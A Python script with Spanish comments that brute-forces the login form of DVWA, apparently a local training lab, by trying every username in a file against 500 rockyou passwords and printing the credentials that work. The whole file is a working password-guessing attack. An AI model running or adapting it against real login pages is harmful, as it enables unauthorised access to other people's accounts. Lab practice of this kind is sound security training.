import requests
import time
import sys

# Configuración
url = "http://localhost/vulnerabilities/brute/"
phpsessid = "4s5q2bhqt015mt52sqmlnmdtr2" 

headers = {
    "Cookie": f"PHPSESSID={phpsessid}; security=low"
}

# Cargar listas desde archivos
try:
    with open('usuarios_rockyou.txt', 'r') as f:
        usuarios = [line.strip() for line in f.readlines() if line.strip()]
    
    with open('rockyou-mini.txt', 'r', encoding='utf-8', errors='ignore') as f:
        contrasenas = [line.strip() for line in f.readlines()[:500]] 
    
    print(f" Configuración cargada:")
    print(f"    {len(usuarios)} usuarios")
    print(f"    {len(contrasenas)} contraseñas")
    print(f"    {len(usuarios) * len(contrasenas)} combinaciones totales")
    
except FileNotFoundError as e:
    print(f" Error: {e}")
    print(" Ejecuta primero los pasos de preparación en WSL")
    sys.exit(1)

# Contadores
credenciales_encontradas = []
intentos = 0
inicio = time.time()



try:
    for usuario in usuarios:
        for contrasena in contrasenas:
            intentos += 1
            
            params = {
                "username": usuario,
                "password": contrasena,
                "Login": "Login"
            }
            
            try:
                respuesta = requests.get(url, params=params, headers=headers, timeout=5)
                
                if "Welcome to the password protected area" in respuesta.text:
                    print(f" CREDENCIAL VÁLIDA: {usuario} / {contrasena}")
                    credenciales_encontradas.append((usuario, contrasena))
                else:
                    if intentos % 100 == 0:  # Mostrar progreso cada 100 intentos
                        print(f" Progreso: {intentos}/{len(usuarios)*len(contrasenas)} intentos")
                        
            except requests.exceptions.Timeout:
                print(f" Timeout con {usuario}/{contrasena}")
            except Exception as e:
                print(f" Error con {usuario}/{contrasena}: {e}")

except KeyboardInterrupt:
    print("\n Interrumpt")

# Resultados finales

tiempo_total = time.time() - inicio

print(f" Tiempo total: {tiempo_total:.2f} segundos")
print(f"Intentos realizados: {intentos}")
print(f" Credenciales encontradas: {len(credenciales_encontradas)}")

if credenciales_encontradas:
    print(" Credenciales válidas:")
    for usuario, contrasena in credenciales_encontradas:
        print(f"    {usuario} /  {contrasena}")
else:
    print(" No se encontraron credenciales válidas")

# Estadísticas de rendimiento
if intentos > 0:
    intentos_por_segundo = intentos / tiempo_total

    print(f" Velocidad: {intentos_por_segundo:.2f} intentos/segundo")
